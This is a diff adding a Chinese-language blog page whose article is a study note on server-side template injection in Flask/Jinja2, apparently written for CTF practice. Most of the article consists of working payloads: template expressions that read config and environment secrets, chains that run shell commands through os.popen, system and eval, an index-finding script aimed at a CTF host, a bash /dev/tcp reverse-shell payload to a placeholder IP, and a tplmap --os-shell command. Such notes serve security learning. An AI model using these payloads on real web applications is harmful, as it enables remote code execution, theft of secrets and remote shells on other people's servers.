@@ -1,0 +1,586 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>ssti注入-Pyhon安全 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ssti注入-Pyhon安全">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-02-09 19:57" pubdate>
+        2020年2月9日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      998 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ssti注入-Pyhon安全</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年12月20日 中午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
+<h1 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h1><h3 id="1-ssti注入漏洞原理："><a href="#1-ssti注入漏洞原理：" class="headerlink" title="1.ssti注入漏洞原理："></a>1.ssti注入漏洞原理：</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty  twig，java框架jade  velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
+<h3 id="2-渲染模板"><a href="#2-渲染模板" class="headerlink" title="2.渲染模板"></a>2.渲染模板</h3><p>flask/jinja</p>
+<p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span> 返回类型所属的对象<br><br><span class="hljs-strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><br> <span class="hljs-strong">__base__</span>  返回该对象所继承的基类 <br><br><span class="hljs-section">######## <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的</span><br><br> <span class="hljs-strong">__subclasses__</span>()   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 <br><br><span class="hljs-strong">__init__</span> 类的初始化方法<br><br><span class="hljs-strong">__globals__</span>  对包含函数全局变量的字典的引用<br><br><span class="hljs-section">#</span><br></code></pre></td></tr></table></figure>
+<p>下图是从网上拔下来的一张对ssti注入基本判断的思路图：</p>
+<p><img src="/2020/02/09/ssti%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/5.png" srcset="/img/loading.gif"></p>
+<h3 id="3-一些姿势"><a href="#3-一些姿势" class="headerlink" title="3.一些姿势"></a>3.一些姿势</h3><h4 id="１．config"><a href="#１．config" class="headerlink" title="１．config"></a>１．config</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="xml">可以获取当前设置，如果题目类似app.config [&#x27;FLAG&#x27;] = os.environ.pop（&#x27;FLAG&#x27;），那可以直接访问</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>[&#x27;FLAG&#x27;]&#125;&#125;</span><span class="xml">或者</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.FLAG</span>&#125;&#125;</span><span class="xml">得到flag</span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="２．self"><a href="#２．self" class="headerlink" title="２．self"></a>２．self</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self</span>&#125;&#125;</span><span class="xml"> ⇒ <span class="hljs-tag">&lt;<span class="hljs-name">TemplateReference</span> <span class="hljs-attr">None</span>&gt;</span></span><br><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__dict__._TemplateReference__context.config</span>&#125;&#125;</span><span class="xml"> ⇒ 同样可以找到config</span><br></code></pre></td></tr></table></figure>
+<p>有时候一些题目是ssti和jwt知识点进行混合利用</p>
+<p>利用<code>&#123;&#123;__self__.dict&#125;&#125;</code>或许可以找到一些key</p>
+<h4 id="３．””、-、-等数据结构"><a href="#３．””、-、-等数据结构" class="headerlink" title="３．””、[]、()等数据结构"></a>３．””、[]、()等数据结构</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">主要目的是配合<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>]这样找到<span class="hljs-keyword">object</span>类  &#123;&#123;<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">68</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;os&#x27;].<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>environ<span class="hljs-literal">[&#x27;FLAG&#x27;]</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="４．url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-……"><a href="#４．url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-……" class="headerlink" title="４．url_for/g/request/namespace/lipsum/range/session/dict/get/flashed messages/……"></a>４．url_for/g/request/namespace/lipsum/range/session/dict/get/flashed messages/……</h4><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;&#123;url_for.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;current_app&#x27;</span>].config.<span class="hljs-built_in">FLAG</span>&#125;&#125;<br>&#123;&#123;get_flashed_messages.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;current_app&#x27;</span>].config.<span class="hljs-built_in">FLAG</span>&#125;&#125;<br>&#123;&#123;request.application.<span class="hljs-variable">__self__</span>.<span class="hljs-variable">_get_data_for_json</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;json&#x27;</span>].JSONEncoder.<span class="hljs-keyword">default</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;current_app&#x27;</span>].config[<span class="hljs-string">&#x27;FLAG&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="5-我经常使用的类（想调用os）"><a href="#5-我经常使用的类（想调用os）" class="headerlink" title="5.我经常使用的类（想调用os）"></a>5.我经常使用的类（想调用os）</h4><p>1.我比较经常使用<code>class &#39;os._wrap_close&#39;</code>这个类</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br><br><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;ls -all&#x27;</span>).read()&#125;&#125;</span><br><br><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><br><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;system&#x27;](<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<p>有时候需要找到我们要使用的类的位置，但是index()方法有无法使用的话</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&#x27;http://2b5db068-21ca-447f-9d96-82b6a96f9b1d.node3.buuoj.cn/qaq?name=&#123;&#123;%22%22.__class__.__base__.__subclasses__()&#125;&#125;&#x27;</span><br><br><br>r = requests.get(url)<br><br>r.encoding = r.apparent_encoding<br><span class="hljs-built_in">list</span> = re.findall(<span class="hljs-string">&#x27;&amp;lt;class &amp;#39;(.*?)&amp;#39;&#x27;</span>,r.text)<span class="hljs-comment">#根据自己的情况设置正则</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>[i]:<br>        print(i)<br>        print(<span class="hljs-built_in">list</span>[i])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>2.还有warnings.catch_warnings类</p>
+<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hy">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><br><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">177</span>].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#x27;)&#125;&#125;<br><br><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">177</span>].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>3.反弹ｓｈｅｌｌ给公网ip</p>
+<p>还是使用warnings.catch_warnings</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[177].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -i &gt;&amp; /dev/tcp/aaa.aaa.aaa.aaa/9090 0&gt;&amp;1&#x27;)&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<p>4.对于ssti注入可以使用tplmap工具进行攻击</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> tplmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://2b5db068-21ca-447f-9d96-82b6a96f9b1d.node3.buuoj.cn/qaq?name=&quot;</span> --os-<span class="hljs-keyword">shell</span><br>＃＃＃＃有时候可以拿<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="BYPASS资源链接："><a href="#BYPASS资源链接：" class="headerlink" title="BYPASS资源链接："></a>BYPASS资源链接：</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">python安全学习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ssti%E6%B3%A8%E5%85%A5/">ssti注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">暴力破解漏洞学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/02/09/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                        <span class="hidden-mobile">python基础知识</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
